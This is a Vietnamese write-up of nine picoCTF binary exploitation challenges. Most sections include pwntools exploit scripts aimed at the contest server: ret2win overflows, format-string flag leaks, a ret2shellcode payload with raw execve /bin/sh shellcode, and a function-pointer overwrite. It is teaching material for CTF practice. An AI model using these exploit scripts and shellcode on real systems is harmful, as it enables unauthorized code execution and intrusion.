<details>
<summary>1. Buf0 </summary>
    
- Bài này cho 1 file source và 1 file binary
- Mình đọc file source thì thấy nó sẽ gọi hàm in flag nếu bị overflow. Ngoài ra có hàm `gets` khiến ta nhập tuỳ thích và `strcpy` làm buf2 bị overflow nếu len input > 16

![](https://i.imgur.com/6FYe0IP.png)

- Vậy mình chỉ cần input đủ dài (>16) là được
    
![](https://i.imgur.com/azBQ14m.png)

- Kết nối chạy thử và ta đã lấy được flag
</details>

<details>
<summary>2. Buf1 </summary>
    
- Bài này cho 1 file source và 1 file binary
- Mình đọc file source thì thấy có hàm win để lấy shell. Ngoài ra có lỗi buffer overflow do `gets` ở hàm `vuln`

![](https://i.imgur.com/NzkGj1c.png)

- Checksec thử thì thấy tắt hết nên ta chỉ cần gdb rồi tìm padding oveflow như bình thường là được.

![](https://i.imgur.com/OeG97Qy.png)

- Script:
```python=
from pwn import *
exe = ELF("vuln")
p= remote("saturn.picoctf.net",62172)
payload = b"A"*44 + p32(exe.sym['win'])
p.sendlineafter(b'string: \n',payload)
p.interactive()
```

- Chạy script và ta sẽ có được flag.
    
</details>



<details>
<summary>3. Buf2 </summary>
    
- Bài này cho 1 file source và 1 file binary
- Mình đọc file source thì thấy có lỗi overflow khi nhập bằng hàm `gets`.
    
![](https://i.imgur.com/Hz2ObzC.png)

- Tiếp theo có hàm `win` sẽ cho ta flag nếu thoả 2 arguments. Sau đó ta `checksec`
    
![](https://i.imgur.com/Qv2sVET.png)
    
- Đây là file 32 bit và theo calling convention thì argument sẽ được push lên stack theo reverse order.
- Vậy bài này ta sẽ lợi dụng buffer overflow để chuyển return address của hàm `vuln` qua hàm `win`
- Để biết chắc chắn arguments nằm ở đâu mình sẽ gdb, sẵn tìm padding luôn
    
![](https://i.imgur.com/CJgpqkb.png)

![](https://i.imgur.com/SwIHfOY.png)
    
- Stack frame khi chạy qua hàm `win` sẽ có dạng như sau:
    
![](https://i.imgur.com/l8sAJiJ.png)

- Do đó ta cần padding thêm 4 byte trước khi đưa argument. Vậy thứ tự payload sẽ là:  112 byte padding + address của `win` + 4 byte padding + `0xcafef00d` + `0xf00df00d`
- Script:
```python=
from pwn import *

exe = ELF("vuln")
p=remote("saturn.picoctf.net",51014)
payload = b'A'*112 +p32(exe.sym['win'])+b'A'*4+p32(0xcafef00d)+p32(0xf00df00d)
p.sendlineafter(b'string: \n',payload)
p.interactive()
```
    
- Chạy script trên ta sẽ có được flag
</details>
  
<details>
<summary>4. x-sixty-what </summary>
    
- Bài này cho 1 file source và 1 file binary
- Mình đọc file source thì thấy bị overflow do hàm `gets`. Ngoài ra cũng có hàm `flag` in ra flag.
    
![](https://i.imgur.com/63lgjEU.png)

![](https://i.imgur.com/dNKRd0d.png)

- Vậy ta sẽ overflow ret address của `vuln` thành hàm `flag`.
- Sau đó ta vào gdb tìm padding

![](https://i.imgur.com/XnLuZBp.png)

- Rồi viết script để chạy:
```python=
from pwn import *
exe=ELF("vuln")
p=remote("saturn.picoctf.net",62515)
payload = b'A'*72+p64(exe.sym['flag'])
p.sendlineafter(b'flag: \n',payload)
p.interactive()
```
- Chạy thử thì ta sẽ bị lỗi xmm1 do `win` có push lên stack làm rsp không chia hết cho 16. Vậy ta chỉ ret vào sau hàm push.

- Final script:
```python=
from pwn import *
exe=ELF("vuln")
p=remote("saturn.picoctf.net",62515)
payload = b'A'*72+p64(exe.sym['flag']+5)
p.sendlineafter(b'flag: \n',payload)
p.interactive()
```
</details>

<details>
<summary>5. flag leak </summary>
    
- Bài này cho 1 file source và 1 file binary
- Đầu tiên ta mở file source lên đọc. Nhận thấy có lỗi format string ở hàm `vuln`, vậy ta sẽ lợi dụng nó để đọc flag đã được mở trước đó.
    
![](https://i.imgur.com/3dwtEuA.png)

- Tiếp theo ta checksec thì nhận thấy đây là file 32 bit. Theo calling convention thì arguments sẽ được push lên stack. Do đó ta sẽ gdb để xem offset.
    
![](https://i.imgur.com/XCuPhPk.png)

- Ta tính ra được 20. Vậy ta chỉ cần input `%20$s` để leak flag. Mình chạy local trên máy mình thì ra được flag nhưng remote thì lại không được (chắc tại khác môi trường) nên mình thử những giá trị lân cận đó thì được `%24$s` là ra được flag

![](https://i.imgur.com/tTL0YPX.png)

</details>

<details>
<summary>6. ropfu </summary>
    
- Bài này cho 1 file source và 1 file binary
- Đầu tiên ta mở file source lên xem thử
    
![](https://i.imgur.com/PPDimxc.png)

- Vậy là có lỗi buffer overflow, trong source không có chỗ nào để lấy shell nên ta checksec thử.
    
![](https://i.imgur.com/dceyyPo.png)

- NX,PIE disable nên bài này mình làm ret2shell cho dễ
- Vậy ta gdb tìm offset để tính tiếp.
    
![](https://i.imgur.com/xns3FVp.png)

- Ta được offset là 28 và khi đó eax chứa địa chỉ của buffer mình nhập. Vậy thì ta cần kiếm gadget jmp vào eax hoặc call eax. Mình thử thì chạy call eax thì được còn jmp eax thì không.

- Script (shellcode mình chôm trên mạng):
```python=
from pwn import *

p = remote("saturn.picoctf.net",53296)
call_eax = 0x0804901d
shell = b'\x83\xec\x50\x31\xd2\x52\x31\xc9\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80'
payload =shell + b'A'*(28-len(shell)) + p32(call_eax)
p.sendlineafter(b'grasshopper!\n',payload)
p.interactive()
```
- Chạy thử và ta có được shell và chỉ cần lấy flag.

</details>

<details>
<summary>7. function overwrite </summary>
    
- Bài này cho 1 file source và 1 file binary
- Đầu tiên mình đọc file source thì thấy ta sẽ lấy được flag nếu kết quả của `calculate_story_score` bằng 13371337. Nhưng điều này là không khả thi vì len của `story` là 128 và chúng ta không thể input được string sau cho ra đúng yêu cầu đề bài.
- Xem kỹ source ta sẽ thấy hàm `check` trỏ về hàm `hard_checker` và có lệnh này ở hàm vuln

![](https://i.imgur.com/PApsYT7.png)

- `If num1 < 10` tức ta có thể input số âm. Ngoài ra ta có `type a[i]` tương đương truy cập với `địa chỉ của a + i*sizeof(type)` do đó ta có thể lợi dụng điều này để khiến hàm fun trở về hàm check sau đó sử dụng giá trị trong đây để nhảy về hàm khác.
                
- Ta đi tìm địa chỉ hàm fun và check
                
![](https://i.imgur.com/NJggbyl.png)

- Ta giải phương tình sau để tìm ra được i: `0x0804c080+4*i=0x0804c040`. Vây ta cần nhập `-16` để hàm fun trỏ về hàm check. Sau đó ta cần tìm offset để điều chỉnh cho hợp lý.
                
![](https://i.imgur.com/VWwT2N9.png)

- Mình sẽ nhảy vào `hardchecker+47` để bypass khúc check bằng 13371337 phí trên. Vậy ta cần nhập số thứ 2 là 47.

- Vậy ta kết nối với server và lấy flag. Lần nhập đầu tiên thì nhập đại cái nào cũng được nhưng lần thứ 2 sẽ là `-16 47`

![](https://i.imgur.com/hkAvnDg.png)

</details>
    
<details>
<summary>8. Stack Cache </summary>
    
- Bài này cho 1 file source và 1 file binary
- Mình đọc file source thì thấy bị overflow do `gets` ở hàm `vuln`, ngoài ra có hàm `win` được gọi tới sẽ load file `flag.txt`. Còn có thêm hàm `underconstruction` in ra `%p %p` nhưng khúc trên không khai báo, vậy đây tương đương lỗi format string
    
![](https://i.imgur.com/8nlBQKD.png)

- Tiếp theo mình `checksec`. Nhận thấy có canary bật và đây là file 32 bit.

![](https://i.imgur.com/khwUh32.png)

- Vậy mình gdb để xem sao thì nhận thấy trước khi ret nó không hề check canary nên ta sẽ thoải mái overflow nhảy qua hàm win sau đó là hàm underconstruction để leak flag.

- Ta sài gdb tìm offset như bình thường sau đó nhảy qua hàm underconstruction xem thử leak gì

![](https://i.imgur.com/WlvNN5X.png)

- Flag lúc này đã được reverse vậy thì khi %p sẽ leak flag từ dưới lên trên.

- Ta viết script kết nối với server thì nhận được dãy hex sau:

![](https://i.imgur.com/dj7DRF4.png)

- Sau đó ta decode dãy trên

![](https://i.imgur.com/MToubYx.png)

- Rồi reverse lại thủ công bằng tay tiếp thì ta được flag `picoCTF{Cle4N_uP_M3m0rY_c7f3d997}` 

- Script : 
```python=
from pwn import *
exe = ELF("vuln")
p= remote("saturn.picoctf.net",61570)
payload = b"a"*14 + p32(exe.sym['win'])+p32(exe.sym['UnderConstruction'])

p.sendlineafter(b'flag\n',payload)
p.interactive()
```
</details>
    
<details>
<summary>9. basic file exploit </summary>
    
- Bài này chỉ cho 1 file source
- Đầu tiên ta mở lên coi có gì thì nhận thấy file gần 200 line và đầu file có khai báo flag

![](https://i.imgur.com/sa1zC83.png)

- Vậy mục đích là làm sao để in được file flag này ra. 
- Ta ctrl-f kiếm thử coi flag có được sài ở đâu không thì thấy có ở hàm `data_read()`

![](https://i.imgur.com/M7GNSCR.png)

- Vậy ta cần làm thoả mãn điều kiện sau: `entry_number = strtol(entry, NULL, 10)) == 0`

- Ta phân tích như sau : hàm `strtol` sẽ chuyển `entry` từ string sang int (hệ 10) tức là chuỗi '123' sẽ thành số 123 sau đó gán cho `entry_number` rồi check `entry_number` có bằng 0 hay không. Vậy mục đích của ta là làm cho `strtol` return 0.

![](https://i.imgur.com/GdPTvWJ.png)

- Đọc man page thì ta nhận thấy hàm này chỉ return 0 khi bị lỗi không convert được hoặc số entry number ta nhập là số 0.

![](https://i.imgur.com/Rimb0HK.png)

- Cách nào cũng được vậy thì ta thử cách nhập số 0.
- Control flow của chương trình như sau : Nhập input -> check input là 1,2 hay 3 rồi thực hiện tương ứng. Để nhập được entry number là 0 thì ta trước đó phải chọn số 1 để ghi vào trước (ghi gì cũng được). 

- Ta thực hiện ý tưởng trên và có được flag

![](https://i.imgur.com/HyuRg9T.png)

</details>